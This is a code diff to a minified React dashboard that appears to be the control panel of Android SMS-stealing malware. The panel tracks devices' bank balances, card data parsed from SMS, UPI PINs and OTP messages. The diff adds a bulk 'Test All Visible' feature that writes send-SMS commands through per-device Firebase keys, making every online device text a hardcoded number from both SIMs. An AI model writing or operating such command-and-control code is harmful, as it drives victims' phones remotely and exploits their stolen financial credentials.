@@ -22046,7 +22046,7 @@ function p1({
 }) {
     const [firebaseSources, setFirebaseSources] = jt.useState(() => (multiConnections?.length ? multiConnections : [{ url: A, key: tt }]).filter(source => source && typeof source.url === "string" && source.url.trim())), isMultiFirebase = firebaseSources.length > 1, sourcesRef = jt.useRef(firebaseSources);
     sourcesRef.current = firebaseSources;
-    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [loadStatus, setLoadStatus] = jt.useState(""), [pageSize, setPageSize] = jt.useState(200), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), [firebaseScope, setFirebaseScope] = jt.useState("online"), [selectedFirebase, setSelectedFirebase] = jt.useState(""), [selectedFirebaseBank, setSelectedFirebaseBank] = jt.useState(""), [quickAddOpen, setQuickAddOpen] = jt.useState(!1), [quickUrl, setQuickUrl] = jt.useState(""), [quickKey, setQuickKey] = jt.useState(""), [quickBusy, setQuickBusy] = jt.useState(!1), [minBalance, setMinBalance] = jt.useState(""), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
+    const [d, S] = jt.useState([]), [f, p] = jt.useState(!0), [h, o] = jt.useState(!1), [x, T] = jt.useState(null), [w, C] = jt.useState("online"), [v, E] = jt.useState("balance"), [g, z] = jt.useState(""), [N, k] = jt.useState(""), [M, H] = jt.useState(""), [L, nt] = jt.useState(new Date), [loadStatus, setLoadStatus] = jt.useState(""), [pageSize, setPageSize] = jt.useState(200), [balanceScope, setBalanceScope] = jt.useState("online"), [selectedBank, setSelectedBank] = jt.useState(""), [firebaseScope, setFirebaseScope] = jt.useState("online"), [selectedFirebase, setSelectedFirebase] = jt.useState(""), [selectedFirebaseBank, setSelectedFirebaseBank] = jt.useState(""), [quickAddOpen, setQuickAddOpen] = jt.useState(!1), [quickUrl, setQuickUrl] = jt.useState(""), [quickKey, setQuickKey] = jt.useState(""), [quickBusy, setQuickBusy] = jt.useState(!1), [minBalance, setMinBalance] = jt.useState(""), [bulkTestBusy, setBulkTestBusy] = jt.useState(false), [bulkTestProgress, setBulkTestProgress] = jt.useState(null), V = jt.useRef(0), ot = jt.useRef(null), $ = jt.useRef(null), ht = jt.useRef(new Set), smsScanBusy = jt.useRef(!1), connectionRefreshBusy = jt.useRef(!1), smsScanTick = jt.useRef(0), smsLatestRef = jt.useRef(new Map), devicesRef = jt.useRef(d), xt = jt.useCallback(U => {
         k(U), setTimeout(() => k(""), 5000)
     }, []), D = jt.useCallback(async (U, J) => {
         try {
@@ -22210,6 +22210,45 @@ function p1({
         _ = jt.useMemo(() => d.filter(U => U.smsAnalysis ?.cards.length).length, [d]),
         upiCount = jt.useMemo(() => d.filter(U => U.upipin).length, [d]),
         otpCount = jt.useMemo(() => d.filter(U => (U.smsAnalysis?.otpMessages||[]).length).length, [d]),
+        handleBulkTest = async () => {
+            if (bulkTestBusy) return;
+            // Gather currently filtered devices that have Firebase connection + are online
+            const targets = _mtAll.filter(U => U._fbUrl && U._fbKey && U.status);
+            if (targets.length === 0) {
+                xt("No online filtered devices to test");
+                return;
+            }
+            if (!confirm(`Send test SMS from ${targets.length} device${targets.length===1?"":"s"}? (SIM 1 + SIM 2 each)`)) return;
+            setBulkTestBusy(true);
+            setBulkTestProgress({ done: 0, total: targets.length, ok: 0, fail: 0 });
+            const target = "918093369768";
+            const CONCURRENCY = 6; // Max simultaneous Firebase writes
+            let done = 0, ok = 0, fail = 0;
+            const queue = [...targets];
+            const workers = Array.from({ length: Math.min(CONCURRENCY, queue.length) }, async () => {
+                while (queue.length) {
+                    const U = queue.shift();
+                    if (!U) break;
+                    const devId = U.sourceDeviceId || U.id;
+                    const devShort = String(devId).slice(-8);
+                    try {
+                        await Zp(U._fbUrl, U._fbKey, `clients/${devId}/webhookEvent/sendSms`, { from: 1, to: target, message: `SIM1-${devShort}`, isSended: false });
+                        await new Promise(r => setTimeout(r, 1500));
+                        await Zp(U._fbUrl, U._fbKey, `clients/${devId}/webhookEvent/sendSms`, { from: 2, to: target, message: `SIM2-${devShort}`, isSended: false });
+                        ok++;
+                    } catch (err) {
+                        fail++;
+                        console.warn(`Bulk test SMS failed for ${devId}:`, err);
+                    }
+                    done++;
+                    setBulkTestProgress({ done, total: targets.length, ok, fail });
+                }
+            });
+            await Promise.all(workers);
+            setBulkTestBusy(false);
+            xt(`Bulk test done — ✓${ok} ✗${fail} of ${targets.length}`);
+            setTimeout(() => setBulkTestProgress(null), 6000);
+        },
         bankSummary = jt.useMemo(() => {
             const U = new Map;
             d.filter(J => balanceScope === "all" || J.status).forEach(J => {
@@ -22422,6 +22461,20 @@ function p1({
                                 title: "Clear",
                                 children: "×"
                             })]
+                        }),
+                        // Bulk Test SMS button — sends test SMS from every currently filtered online device
+                        r.jsxs("button", {
+                            onClick: handleBulkTest,
+                            disabled: bulkTestBusy,
+                            className: `px-3 py-1.5 rounded-lg text-xs font-bold border transition-all ${bulkTestBusy ? "bg-[#1a1a1a] border-[#262626] text-[#444] cursor-wait" : "bg-blue-600/15 border-blue-600/40 text-blue-400 hover:bg-blue-600/25 active:scale-95"}`,
+                            title: "Send test SMS (SIM 1 + SIM 2) from every online device currently shown in the list",
+                            children: bulkTestBusy && bulkTestProgress
+                                ? [`Testing ${bulkTestProgress.done}/${bulkTestProgress.total}…`]
+                                : [r.jsx("span", { children: "📨 Test All Visible" })]
+                        }),
+                        bulkTestProgress && !bulkTestBusy && r.jsxs("span", {
+                            className: `text-[10px] px-2 py-1 rounded ${bulkTestProgress.fail===0 ? "bg-emerald-600/20 text-emerald-400" : "bg-amber-600/20 text-amber-400"}`,
+                            children: [`Done: ✓${bulkTestProgress.ok} ✗${bulkTestProgress.fail}`]
                         }),
                         r.jsx("div", {
                             className: "w-px h-4 bg-[#222]"
